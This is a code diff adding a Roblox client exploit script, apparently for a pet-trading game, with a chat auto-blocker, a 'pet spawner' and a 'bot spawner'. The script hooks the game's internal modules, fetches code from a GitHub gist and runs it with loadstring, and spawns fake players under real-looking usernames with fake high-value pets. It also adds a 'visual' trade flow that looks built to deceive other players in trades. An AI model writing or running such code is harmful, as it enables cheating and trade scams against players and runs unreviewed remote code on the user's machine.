+    StatsLabel.Text = "blocked: 0 | last: none"
+    StatsLabel.Parent = Body
+
+    local ToggleButton = Instance.new("TextButton")
+    ToggleButton.Size = UDim2.new(1, 0, 0, 34)
+    ToggleButton.Position = UDim2.new(0, 0, 0, 42)
+    ToggleButton.BackgroundColor3 = Color3.fromRGB(40, 110, 255)
+    ToggleButton.BorderSizePixel = 0
+    ToggleButton.Font = Enum.Font.GothamBold
+    ToggleButton.TextSize = 12
+    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ToggleButton.Text = "🟢 instant: on"
+    ToggleButton.Parent = Body
+    local ToggleCorner = Instance.new("UICorner")
+    ToggleCorner.CornerRadius = UDim.new(0, 10)
+    ToggleCorner.Parent = ToggleButton
+
+    local playersTitle = Instance.new("TextLabel")
+    playersTitle.Size = UDim2.new(1, 0, 0, 18)
+    playersTitle.Position = UDim2.new(0, 0, 0, 84)
+    playersTitle.BackgroundTransparency = 1
+    playersTitle.Font = Enum.Font.GothamBold
+    playersTitle.TextSize = 11
+    playersTitle.TextColor3 = Color3.fromRGB(170, 190, 255)
+    playersTitle.TextXAlignment = Enum.TextXAlignment.Left
+    playersTitle.Text = "tap a player to block"
+    playersTitle.Parent = Body
+
+    local playerList = Instance.new("ScrollingFrame")
+    playerList.Size = UDim2.new(1, 0, 1, -108)
+    playerList.Position = UDim2.new(0, 0, 0, 108)
+    playerList.BackgroundColor3 = Color3.fromRGB(12, 26, 58)
+    playerList.BorderSizePixel = 0
+    playerList.ScrollBarThickness = 4
+    playerList.CanvasSize = UDim2.new()
+    playerList.Parent = Body
+    playerList.Active = true
+
+    local plc = Instance.new("UICorner")
+    plc.CornerRadius = UDim.new(0, 10)
+    plc.Parent = playerList
+
+    local pad = Instance.new("UIPadding")
+    pad.PaddingTop = UDim.new(0, 8)
+    pad.PaddingBottom = UDim.new(0, 8)
+    pad.PaddingLeft = UDim.new(0, 8)
+    pad.PaddingRight = UDim.new(0, 8)
+    pad.Parent = playerList
+
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.Padding = UDim.new(0, 4)
+    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    listLayout.Parent = playerList
+
+    local function updateStats()
+        StatsLabel.Text = ("blocked: %d | last: %s"):format(blockedCount, tostring(lastBlockedPlayer))
+    end
+
+    local function setActive(on)
+        if on then
+            ToggleButton.Text = "🟢 instant: on"
+            ToggleButton.BackgroundColor3 = Color3.fromRGB(40, 110, 255)
+            StatusLabel.Text = "status: 🟢 active"
+            StatusLabel.TextColor3 = Color3.fromRGB(170, 210, 255)
+        else
+            ToggleButton.Text = "🔴 instant: off"
+            ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 90, 120)
+            StatusLabel.Text = "status: 🔴 inactive"
+            StatusLabel.TextColor3 = Color3.fromRGB(255, 160, 160)
+        end
+    end
+    setActive(PLAYER_BLOCKER_CONFIG.AUTO_BLOCK_ENABLED)
+
+    -- =========================================
+    -- INSTANT BLOCK (must be defined BEFORE list buttons + chat hooks)
+    -- =========================================
+    local function instantBlockPlayer(plr, keyword, message)
+        if not plr or plr == LocalPlayer then return false end
+
+        if playerBlockerState.blockedPlayers[plr.UserId] then
+            return false
+        end
+        playerBlockerState.blockedPlayers[plr.UserId] = true
+
+        pcall(function()
+            BlockPlayer(plr)
+        end)
+
+        blockedCount = blockedCount + 1
+        lastBlockedPlayer = plr.Name
+        updateStats()
+
+        print("⚡ INSTANT BLOCK:", plr.Name, "for:", tostring(keyword))
+        print("📝 msg:", tostring(message))
+        return true
+    end
+
+    -- =========================================
+    -- PLAYER LIST (tap to block) + auto update
+    -- =========================================
+    local rowButtons = {} -- [userId] = TextButton
+
+    local function makeRow(plr)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 28)
+        btn.BackgroundColor3 = Color3.fromRGB(22, 40, 85)
+        btn.BorderSizePixel = 0
+        btn.Font = Enum.Font.Gotham
+        btn.TextSize = 12
+        btn.TextColor3 = Color3.fromRGB(220, 230, 255)
+        btn.TextXAlignment = Enum.TextXAlignment.Left
+        btn.Text = "  " .. plr.Name
+        btn.Parent = playerList
+
+        local bc = Instance.new("UICorner")
+        bc.CornerRadius = UDim.new(0, 8)
+        bc.Parent = btn
+
+        btn.MouseButton1Click:Connect(function()
+            if ToggleButton.Text:find("off") then return end
+            if plr and plr.Parent == Players and plr ~= LocalPlayer then
+                instantBlockPlayer(plr, "tap_list", "tap_list")
+            end
+        end)
+
+        return btn
+    end
+
+    local function refreshPlayersList()
+        -- remove rows for players that left
+        for uid, btn in pairs(rowButtons) do
+            local stillHere = Players:GetPlayerByUserId(uid)
+            if not stillHere then
+                rowButtons[uid] = nil
+                pcall(function() btn:Destroy() end)
+            end
+        end
+
+        -- add rows for players that exist
+        local all = Players:GetPlayers()
+        table.sort(all, function(a, b) return a.Name:lower() < b.Name:lower() end)
+
+        for _, plr in ipairs(all) do
+            if plr ~= LocalPlayer and not rowButtons[plr.UserId] then
+                rowButtons[plr.UserId] = makeRow(plr)
+            end
+        end
+
+        task.defer(function()
+            playerList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 16)
+        end)
+    end
+
+    refreshPlayersList()
+    table.insert(connections, Players.PlayerAdded:Connect(refreshPlayersList))
+    table.insert(connections, Players.PlayerRemoving:Connect(refreshPlayersList))
+
+    -- =========================================
+    -- AUTO-BLOCK CHAT MONITOR (best-effort)
+    -- =========================================
+    local function handleMessage(fromPlayer, messageText)
+        if not fromPlayer or fromPlayer == LocalPlayer then return end
+        if ToggleButton.Text:find("off") then return end
+
+        local ok, kw = containsKeyword(messageText, PLAYER_BLOCKER_CONFIG.BLOCK_KEYWORDS)
+        if ok then
+            instantBlockPlayer(fromPlayer, kw, messageText)
+        end
+    end
+
+    -- new chat (TextChatService)
+    if TextChatService and TextChatService.MessageReceived then
+        table.insert(connections, TextChatService.MessageReceived:Connect(function(msg)
+            pcall(function()
+                local src = msg.TextSource
+                if not src then return end
+                local plr = Players:GetPlayerByUserId(src.UserId)
+                if not plr then return end
+                handleMessage(plr, msg.Text or "")
+            end)
+        end))
+    end
+
+    -- legacy chat fallback
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            table.insert(connections, p.Chatted:Connect(function(m) handleMessage(p, m) end))
+        end
+    end
+    table.insert(connections, Players.PlayerAdded:Connect(function(p)
+        if p ~= LocalPlayer then
+            table.insert(connections, p.Chatted:Connect(function(m) handleMessage(p, m) end))
+        end
+    end))
+
+    -- =========================================
+    -- TOGGLE
+    -- =========================================
+    ToggleButton.MouseButton1Click:Connect(function()
+        if ToggleButton.Text:find("on") then
+            setActive(false)
+        else
+            setActive(true)
+        end
+    end)
+
+    -- =========================================
+    -- CLOSE (keep cleanup)
+    -- =========================================
+    Close.MouseButton1Click:Connect(function()
+        pcall(function()
+            for _, c in ipairs(connections) do
+                pcall(function() c:Disconnect() end)
+            end
+        end)
+        ScreenGui:Destroy()
+    end)
+
+    -- =========================================
+    -- MOBILE DRAG (works on iOS)
+    -- drag from topbar OR anywhere on the frame
+    -- =========================================
+    local dragging = false
+    local dragInput = nil
+    local dragStart = nil
+    local startPos = nil
+
+    local function beginDrag(input)
+        dragging = true
+        dragInput = input
+        dragStart = input.Position
+        startPos = MainFrame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                dragInput = nil
+            end
+        end)
+    end
+
+    local function doDrag(input)
+        if not dragging or not dragStart or not startPos then return end
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+
+    TopBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            beginDrag(input)
+        end
+    end)
+
+    MainFrame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            beginDrag(input)
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput or input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
+            doDrag(input)
+        end
+    end)
+end
+
+local function runPetSpawner()
+    -- ✅ loads your pet spawner from gist instead of embedding all the code here
+
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+    -- optional: kill old UI so "launch spawner" can re-open cleanly
+    local PET_GUI_NAME = "PetSpawnerGui" -- keep if your spawner uses this name
+    local old = playerGui:FindFirstChild(PET_GUI_NAME)
+    if old then old:Destroy() end
+
+    -- prevent stacking hooks if they press launch 10 times
+    if _G.__MOSS_SPAWNER_LOADED then
+        warn("[PetSpawner] moss spawner already loaded; re-launching anyway")
+    end
+    _G.__MOSS_SPAWNER_LOADED = true
+
+    local url = "https://gist.githubusercontent.com/mattsversion/2893aa687b501a5168400fca460fe633/raw/636ec2a48472acff86232e006046207b594e1f0a/mospetspawner.js"
+    local src = game:HttpGet(url)
+
+    local fn, err = loadstring(src)
+    if not fn then
+        error("[PetSpawner] failed to compile gist: " .. tostring(err))
+    end
+
+    return fn()
+end
+
+
+local function runBotSpawner()
+    -- COMPREHENSIVE HOOKS FOR FAKE PLAYERS - MUST BE FIRST
+    local fakePlayerIds = {}
+    _G.fakePlayerIds = fakePlayerIds
+
+    local Players = game:GetService('Players')
+    local ReplicatedStorage = game:GetService('ReplicatedStorage')
+    local RunService = game:GetService('RunService')
+    local UserInputService = game:GetService('UserInputService')
+    local TweenService = game:GetService('TweenService')
+    local HttpService = game:GetService('HttpService')
+    local Workspace = game:GetService("Workspace")
+
+    pcall(function()
+        setthreadidentity(2)
+    end)
+
+    -- Hook SettingsHelper early with better fake player detection
+    task.spawn(function()
+        task.wait(0.1)
+        local SettingsHelper = require(ReplicatedStorage:WaitForChild('Fsys')).load('SettingsHelper')
+        local original_get_setting_server = SettingsHelper.get_setting_server
+        SettingsHelper.get_setting_server = function(player, settingName, ...)
+            if player and player.UserId then
+                if fakePlayerIds[player.UserId] then
+                    return false
+                end
+                if not Players:GetPlayerByUserId(player.UserId) then
+                    return false
+                end
+            end
+            local args = { ... }
+            local success, result = pcall(function()
+                return original_get_setting_server(player, settingName, table.unpack(args))
+            end)
+            if success then
+                return result
+            else
+                return false
+            end
+        end
+    end)
+
+    -- Hook FamilyHelper early
+    task.spawn(function()
+        task.wait(0.1)
+        local FamilyHelper = require(ReplicatedStorage:WaitForChild('Fsys')).load('FamilyHelper')
+        local original_are_friends_family = FamilyHelper.are_friends_family
+        local original_is_my_friend_or_family = FamilyHelper.is_my_friend_or_family
+        local original_are_family_because_friends = FamilyHelper.are_family_because_friends
+        local original_is_my_family_because_friend = FamilyHelper.is_my_family_because_friend
+        
+        FamilyHelper.are_friends_family = function(player1, player2)
+            if player1 and player2 and (fakePlayerIds[player1.UserId] or fakePlayerIds[player2.UserId]) then
+                return false
+            end
+            return original_are_friends_family(player1, player2)
+        end
+        
+        FamilyHelper.is_my_friend_or_family = function(player)
+            if player and fakePlayerIds[player.UserId] then
+                return false
+            end
+            return original_is_my_friend_or_family(player)
+        end
+        
+        FamilyHelper.are_family_because_friends = function(player1, player2)
+            if player1 and player2 and (fakePlayerIds[player1.UserId] or fakePlayerIds[player2.UserId]) then
+                return false
+            end
+            return original_are_family_because_friends(player1, player2)
+        end
+        
+        FamilyHelper.is_my_family_because_friend = function(player)
+            if player and fakePlayerIds[player.UserId] then
+                return false
+            end
+            return original_is_my_family_because_friend(player)
+        end
+    end)
+
+    local Fsys = require(ReplicatedStorage:WaitForChild('Fsys'))
+    local load = Fsys.load
+    local InventoryDB = load('InventoryDB')
+    local downloader = load('DownloadClient')
+    local animationManager = load('AnimationManager')
+    local LocalPlayer = Players.LocalPlayer
+
+    local FakePetRegistry = {}
+    local AnimationManager = {
+        running = false,
+        checkInterval = 0.3,
+        animationTracks = {},
+    }
+
+    local FakePlayers = {}
+
+    -- Define pet rarity tiers (Balloon Unicorn and above)
+    local highValuePets = {
+        'Shadow Dragon',
+        'Bat Dragon',
+        'Frost Dragon',
+        'Giraffe',
+        'Owl',
+        'Parrot',
+        'Crow',
+        'Evil Unicorn',
+        'Balloon Unicorn',
+    }
+
+    -- PRESET USERNAMES
+    local presetUsers = {
+        "NatalieBeanie", 
+        "cartervss",
+        "OMGGBESTIEO",
+        "piercedroma",
+        "Sarit09",
+        "giowinqnat",
+        "Rachel65409",
+        "CammyxBoba",
+        "TheMeganPlays",
+        "NotLeah"
+    }
+
+    local petModels = {}
+    local function getPetModel(kind)
+        if petModels[kind] then
+            return petModels[kind]:Clone()
+        end
+        local success, streamed = pcall(function()
+            local promise = downloader.promise_download_copy('Pets', kind)
+            if promise then
+                return promise:expect()
+            end
+            return nil
+        end)
+        if success and streamed then
+            petModels[kind] = streamed
+            return streamed:Clone()
+        else
+            warn('Failed to download pet model for:', kind)
+            return nil
+        end
+    end
+
+    local function applyMegaNeonEffects(petModel, kind)
+        local petRigs = load('new:PetRigs')
+        local petModelInstance = petModel:FindFirstChild('PetModel') or petModel
+        local petData = InventoryDB.pets[kind]
+        if not petData or not petData.neon_parts then
+            return
+        end
+        for neonPart, configuration in pairs(petData.neon_parts) do
+            local trueNeonPart = petRigs.get(petModelInstance).get_geo_part(petModelInstance, neonPart)
+            if trueNeonPart then
+                trueNeonPart.Material = Enum.Material.Neon
+                local originalColor = configuration.Color
+                if originalColor then
+                    local h, s, v = originalColor:ToHSV()
+                    trueNeonPart.Color = Color3.fromHSV(h, math.min(s * 1.3, 1), math.min(v * 1.4, 1))
+                else
+                    trueNeonPart.Color = Color3.fromRGB(170, 0, 255)
+                end
+            end
+        end
+    end
+
+    local function applyNeonEffects(petModel, kind)
+        local petRigs = load('new:PetRigs')
+        local petModelInstance = petModel:FindFirstChild('PetModel') or petModel
+        local petData = InventoryDB.pets[kind]
+        if not petData or not petData.neon_parts then
+            return
+        end
+        for neonPart, configuration in pairs(petData.neon_parts) do
+            local trueNeonPart = petRigs.get(petModelInstance).get_geo_part(petModelInstance, neonPart)
+            if trueNeonPart then
+                trueNeonPart.Material = Enum.Material.Neon
+                if configuration.Color then
+                    trueNeonPart.Color = configuration.Color
+                end
+            end
+        end
+    end
+
+    local function GetKindPet(name)
+        for k, v in pairs(InventoryDB.pets) do
+            if v['name']:lower() == name:lower() then
+                return k
+            end
+        end
+    end
+
+    local function createFakePetOwner(fakeCharacter, partnerName, partnerId)
+        return setmetatable({
+            Name = partnerName,
+            DisplayName = partnerName,
+            UserId = partnerId,
+            Character = fakeCharacter,
+        }, {
+            __index = function(t, k)
+                if k == 'Parent' then
+                    return Players
+                end
+                if k == 'IsA' then
+                    return function(self, className)
+                        return className == 'Player'
+                    end
+                end
+                if k == 'GetChildren' then
+                    return function()
+                        return {}
+                    end
+                end
+                return rawget(t, k)
+            end,
+            __tostring = function()
+                return partnerName
+            end,
+        })
+    end
+
+    -- Hook InteractionsEngine to block fake pet interactions
+    task.spawn(function()
+        task.wait(0.1)
+        local InteractionsEngine = load('InteractionsEngine')
+        local original_register = InteractionsEngine.register
+        InteractionsEngine.register = function(self, interactionData)
+            if interactionData and interactionData.part then
+                local part = interactionData.part
+                local checkPart = part
+                while checkPart do
+                    if checkPart:GetAttribute('IsFakePet') == true and checkPart.Parent then
+                        return
+                    end
+                    checkPart = checkPart.Parent
+                end
+            end
+            return original_register(self, interactionData)
+        end
+    end)
+
+    function AnimationManager:Start()
+        if self.running then
+            return
+        end
+        self.running = true
+        task.spawn(function()
+            while self.running do
+                task.wait(self.checkInterval)
+                for _, petData in ipairs(FakePetRegistry) do
+                    if petData and petData.model and petData.model.Parent then
+                        pcall(function()
+                            local character = petData.character
+                            if character and character.Parent then
+                                local humanoid = character:FindFirstChild('Humanoid')
+                                if humanoid then
+                                    local animator = humanoid:FindFirstChild('Animator')
+                                    if animator then
+                                        local isRiding = false
+                                        for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+                                            if track.Animation.AnimationId:find('PlayerRidingPet') or track.Animation.AnimationId:find('507766666') then
+                                                isRiding = true
+                                                break
+                                            end
+                                        end
+                                        if not isRiding and petData.hasRidingPet then
+                                            if not petData.ridingAnim or not petData.ridingAnim.IsPlaying then
+                                                if petData.ridingAnim then
+                                                    petData.ridingAnim:Stop()
+                                                end
+                                                petData.ridingAnim = animator:LoadAnimation(animationManager.get_track('PlayerRidingPet'))
+                                                petData.ridingAnim.Looped = true
+                                                petData.ridingAnim:Play()
+                                                humanoid.Sit = true
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                            if petData.wrapper.mega_neon then
+                                applyMegaNeonEffects(petData.model, petData.wrapper.pet_id)
+                            elseif petData.wrapper.neon then
+                                applyNeonEffects(petData.model, petData.wrapper.pet_id)
+                            end
+                        end)
+                    end
+                end
+            end
+        end)
+    end
+
+    function AnimationManager:Stop()
+        self.running = false
+        for _, petData in ipairs(FakePetRegistry) do
+            if petData.ridingAnim then
+                petData.ridingAnim:Stop()
+            end
+        end
+    end
+
+    function AnimationManager:AddPet(petData)
+        table.insert(FakePetRegistry, petData)
+        if not self.running then
+            self:Start()
+        end
+    end
+
+    local function enableNoclip(character)
+        if not character then return end
+        for _, part in ipairs(character:GetDescendants()) do
+            if part:IsA('BasePart') then
+                part.CanCollide = false
+                part.CanTouch = false
+                part.CanQuery = false
+                pcall(function() part.CollisionGroup = 'Noclip' end)
+            end
+        end
+        character.DescendantAdded:Connect(function(descendant)
+            if descendant:IsA('BasePart') then
+                task.wait()
+                descendant.CanCollide = false
+                descendant.CanTouch = false
+                descendant.CanQuery = false
+                pcall(function() descendant.CollisionGroup = 'Noclip' end)
+            end
+        end)
+    end
+
+    -- ========== FAKE PLAYER WITH PET SYSTEM (FROM players.txt) ==========
+    local function CreateFakePlayerCharacter(partner_name, partner_id, pet_type, pet_flags)
+        local maxRetries = 3
+        local retryCount = 0
+        
+        local function attemptCreate()
+            retryCount = retryCount + 1
+            fakePlayerIds[partner_id] = true
+            _G.fakePlayerIds[partner_id] = true
+            
+            local folder_fake = Instance.new('Folder')
+            folder_fake.Name = 'fake_folder_' .. partner_name
+            folder_fake.Parent = workspace
+            
+            local character = Players:CreateHumanoidModelFromUserId(partner_id)
+            local player = Players.LocalPlayer
+            local playerCharacter = player.Character
+            
+            if character and playerCharacter and playerCharacter.Parent then
+                character:SetPrimaryPartCFrame(
+                    playerCharacter.HumanoidRootPart.CFrame * CFrame.new(math.random(-10, 10), 0, math.random(-10, 10))
+                )
+            else
+                character:SetPrimaryPartCFrame(CFrame.new(0, 5, 0))
+            end
+            
+            local humanoid = character:WaitForChild('Humanoid')
+            humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+            humanoid.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
+            humanoid.HealthDisplayDistance = 0
+            character.Parent = folder_fake
+            
+            -- ALWAYS SPAWN WITH PET (players.txt style)
+            local petCreated = false
+            local success, err = pcall(function()
+                local highValuePet = highValuePets[math.random(1, #highValuePets)]
+                local kind = GetKindPet(highValuePet)
+                if not kind then
+                    warn('Could not find pet kind for:', highValuePet)
+                    return
+                end
+                
+                local petModel = getPetModel(kind)
+                if not petModel then
+                    warn('Could not get pet model for kind:', kind)
+                    return
+                end
+                
+                petModel = petModel:Clone()
+                petModel:SetAttribute('IsFakePet', true)
+                
+                -- Apply pet type effects
+                local flags = pet_flags or {
+                    M = pet_type == 'mega',
+                    N = pet_type == 'neon',
+                    F = true,
+                    R = true,
+                }
+                
+                if flags.M then
+                    applyMegaNeonEffects(petModel, kind)
+                elseif flags.N then
+                    applyNeonEffects(petModel, kind)
+                end
+                
+                petModel.Parent = folder_fake
+                petModel:SetPrimaryPartCFrame(character.HumanoidRootPart.CFrame)
+                petModel:ScaleTo(2)
+                
+                for _, part in ipairs(petModel:GetDescendants()) do
+                    if part:IsA('BasePart') then
+                        part:SetAttribute('IsFakePet', true)
+                    end
+                end
+                
+                local ridePosition = petModel:FindFirstChild('RidePosition', true)
+                if ridePosition then
+                    local sourceAttachment = Instance.new('Attachment')
+                    sourceAttachment.Parent = ridePosition
+                    sourceAttachment.Position = Vector3.new(0, 1.237, 0)
+                    sourceAttachment.Name = 'SourceAttachment'
+                    local stateConnection = Instance.new('RigidConstraint')
+                    stateConnection.Name = 'StateConnection'
+                    stateConnection.Attachment0 = sourceAttachment
+                    stateConnection.Attachment1 = character.PrimaryPart.RootAttachment
+                    stateConnection.Parent = character
+                end
+                
+                local ridingAnim = character.Humanoid.Animator:LoadAnimation(animationManager.get_track('PlayerRidingPet'))
+                ridingAnim.Looped = true
+                ridingAnim:Play()
+                character.Humanoid.Sit = true
+                
+                for _, descendant in pairs(character:GetDescendants()) do
+                    if descendant:IsA('BasePart') and descendant.Massless == false then
+                        descendant.Massless = true
+                        descendant:SetAttribute('HaveMass', true)
+                    end
+                end
+                
+                local fakePetOwner = createFakePetOwner(character, partner_name, partner_id)
+                local petWrapper = {
+                    char = petModel,
+                    mega_neon = flags.M or false,
+                    neon = flags.N or false,
+                    player = fakePetOwner,
+                    entity_controller = fakePetOwner,
+                    controller = fakePetOwner,
+                    rp_name = '',
+                    pet_trick_level = math.random(1, 5),
+                    pet_unique = HttpService:GenerateGUID(false),
+                    pet_id = kind,
+                    location = {
+                        full_destination_id = 'housing',
+                        destination_id = 'housing',
+                        house_owner = fakePetOwner,
+                    },
+                    pet_progression = {
+                        age = math.random(1, 900000),
+                        percentage = math.random(0.01, 0.99),
+                    },
+                    are_colors_sealed = false,
+                    is_pet = true,
+                }
+                
+                local petState = {
+                    char = petModel,
+                    player = fakePetOwner,
+                    store_key = 'pet_state_managers',
+                    is_sitting = false,
+                    chars_connected_to_me = {},
+                    states = { { id = 'PetBeingRidden' } },
+                }
+                
+                local ClientData = load('ClientData')
+                local TableUtil = load('TableUtil')
+                local function updateData(key, action)
+                    local data = ClientData.get(key)
+                    local clonedData = table.clone(data)
+                    ClientData.predict(key, action(clonedData))
+                end
+                
+                updateData('pet_char_wrappers', function(petWrappers)
+                    petWrapper.unique = #petWrappers + 1
+                    petWrapper.index = #petWrappers + 1
+                    petWrappers[#petWrappers + 1] = petWrapper
+                    return petWrappers
+                end)
+                
+                updateData('pet_state_managers', function(petStates)
+                    petStates[#petStates + 1] = petState
+                    return petStates
+                end)
+                
+                table.insert(FakePetRegistry, {
+                    wrapper = petWrapper,
+                    state = petState,
+                    model = petModel,
+                    character = character,
+                    hasRidingPet = true,
+                    owner = fakePetOwner,
+                    ridingAnim = ridingAnim,
+                    folder = folder_fake,
+                })
+                
+                if not AnimationManager.running then
+                    AnimationManager:Start()
+                end
+                
+                petCreated = true
+                print('✓ Spawned fake player with pet:', partner_name, highValuePet, flags.M and 'Mega Neon' or flags.N and 'Neon' or 'Regular')
+            end)
+            
+            if not success or not petCreated then
+                warn('Error creating fake player (Attempt ' .. retryCount .. '/' .. maxRetries .. '):', err)
+                folder_fake:Destroy()
+                for i, folder in ipairs(FakePlayers) do
+                    if folder == folder_fake then
+                        table.remove(FakePlayers, i)
+                        break
+                    end
+                end
+                if retryCount < maxRetries then
+                    print('🔄 Retrying fake player creation for ' .. partner_name .. '...')
+                    task.wait(0.5)
+                    return attemptCreate()
+                else
+                    warn('❌ Failed to create fake player after ' .. maxRetries .. ' attempts')
+                    return false
+                end
+            end
+            
+            pcall(function()
+                local UIManager = load('UIManager')
+                UIManager.apps.PlayerNameApp:add_npc_id(character, partner_name)
+            end)
+            
+            local Part = character:FindFirstChild('HumanoidRootPart')
+            if Part then
+                local InteractionsEngine = load('InteractionsEngine')
+                local emptyFunc = function() end
+                local v22 = {
+                    ['text'] = partner_name,
+                    ['part'] = Part,
+                    ['on_selected'] = {
+                        {
+                            ['text'] = 'Profile',
+                            ['on_selected'] = function()
+                                pcall(function()
+                                    load('UIManager').apps.PlayerProfileApp:open_player_profile_for_user_id(partner_id)
+                                end)
+                            end,
+                        },
+                            {
+    ['text'] = 'Trade',
+    ['on_selected'] = function()
+        -- Store the fake player's info for the trade system
+        _G.__ENVISION_PENDING_TRADE = {
+            name = partner_name,
+            id = partner_id,
+            display_name = partner_name,
+            from_bot_interaction = true  -- Flag to bypass the dialog
+        }
+        
+        pcall(function()
+            local HintApp = load('UIManager').apps.HintApp
+            if HintApp then
+                HintApp:hint({
+                    text = 'Trade request sent to ' .. partner_name,
+                    length = 2,
+                    overridable = true,
+                })
+            end
+        end)
+        
+        -- Auto-accept after delay (like real trade flow)
+        task.delay(2, function()
+            if _G.__ENVISION_PENDING_TRADE then
+                -- Set as current target
+                currentTargetDisplayName = partner_name
+                currentTargetName = partner_name
+                currentTargetId = partner_id
+                
+                -- Update UI labels (safe)
+                local function __setTextSafe(lbl, txt)
+                    if typeof(lbl) == "Instance" and (lbl:IsA("TextLabel") or lbl:IsA("TextButton") or lbl:IsA("TextBox")) then
+                        lbl.Text = txt
+                        return true
+                    end
+                    return false
+                end
+
+                __setTextSafe(selectedNameLabel, partner_name)
+
+                if partner_id ~= 0 then
+                    __setTextSafe(selectedIdLabel, "ID: " .. tostring(partner_id))
+                else
+                    __setTextSafe(selectedIdLabel, "ID: visual_only")
+                end
+
+                -- Start the fake trade directly (no dialog)
+                task.spawn(function()
+                    -- Small delay to make it realistic
+                    task.wait(0.5)
+
+                    -- Call the startVisualTrade function but with bypass
+                    -- Call the startVisualTrade function but with bypass (safe)
+_G.__ENVISION_TRADE_BYPASS = true
+
+local __start =
+    (_G and _G.startVisualTrade)
+    or (getgenv and getgenv().startVisualTrade)
+    or startVisualTrade
+
+if type(__start) == "function" then
+    __start()
+else
+    warn("[FakeTrade] startVisualTrade is nil (scope).")
+end
+
+_G.__ENVISION_TRADE_BYPASS = nil
+_G.__ENVISION_PENDING_TRADE = nil
+                end)
+            end
+        end)
+    end,
+},
+                        { ['text'] = 'Give Item...', ['on_selected'] = emptyFunc },
+                        { ['text'] = 'Mute', ['on_selected'] = emptyFunc },
+                    },
+                }
+                pcall(function() InteractionsEngine:register(v22) end)
+            end
+
+            table.insert(FakePlayers, folder_fake)
+            folder_fake:SetAttribute('IsFakePlayer', true)
+            folder_fake:SetAttribute('PartnerName', partner_name)
+            folder_fake:SetAttribute('PartnerId', partner_id)
+            return true
+        end
+        return attemptCreate()
+    end
+
+    local function clearAllFakePlayers()
+        AnimationManager:Stop()
+        for _, petData in ipairs(FakePetRegistry) do
+            if petData and petData.model then
+                local ClientData = load('ClientData')
+                local function updateData(key, action)
+                    local data = ClientData.get(key)
+                    local clonedData = table.clone(data)
+                    ClientData.predict(key, action(clonedData))
+                end
+                pcall(function()
+                    updateData('pet_char_wrappers', function(petWrappers)
+                        for i = #petWrappers, 1, -1 do
+                            if petWrappers[i].pet_unique == petData.wrapper.pet_unique then
+                                table.remove(petWrappers, i)
+                            end
+                        end
+                        return petWrappers
+                    end)
+                end)
+                pcall(function()
+                    updateData('pet_state_managers', function(petStates)
+                        for i = #petStates, 1, -1 do
+                            if petStates[i].char == petData.model then
+                                table.remove(petStates, i)
+                            end
+                        end
+                        return petStates
+                    end)
+                end)
+            end
+        end
+        for _, folder in pairs(FakePlayers) do
+            if folder and folder.Parent then
+                folder:Destroy()
+            end
+        end
+        FakePlayers = {}
+        FakePetRegistry = {}
+        fakePlayerIds = {}
+        _G.fakePlayerIds = {}
+        print('✅ All fake players and pets deleted successfully')
+    end
+
+    _G.__ENVISION_CLEAR_BOTS = clearAllFakePlayers
+
+    --========== cleanup old gui ==========
+    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
+        if gui.Name == "BotSpawnerGUI" then
+            gui:Destroy()
+        end
+    end
+
+    --========== NEW UI: ROYAL BLUE MINIMALISTIC ==========
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BotSpawnerGUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.DisplayOrder = 20
+    screenGui.Parent = LocalPlayer.PlayerGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0, 240, 0, 320) -- Smaller height since no bio
+    mainFrame.Position = UDim2.new(0, 15, 0.5, -160)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 40)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = screenGui
+
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 8)
+    uiCorner.Parent = mainFrame
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(65, 105, 225)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.15
+    stroke.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -16, 0, 24)
+    title.Position = UDim2.new(0, 12, 0, 10)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.TextColor3 = Color3.fromRGB(200, 220, 255)
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Text = "bot spawner"
+    title.Parent = mainFrame
+
+    local sub = Instance.new("TextLabel")
+    sub.Size = UDim2.new(1, -16, 0, 14)
+    sub.Position = UDim2.new(0, 12, 0, 32)
+    sub.BackgroundTransparency = 1
+    sub.Font = Enum.Font.Gotham
+    sub.TextSize = 10
+    sub.TextColor3 = Color3.fromRGB(150, 170, 220)
+    sub.TextXAlignment = Enum.TextXAlignment.Left
+    sub.Text = "made by sippingmeth on dc"
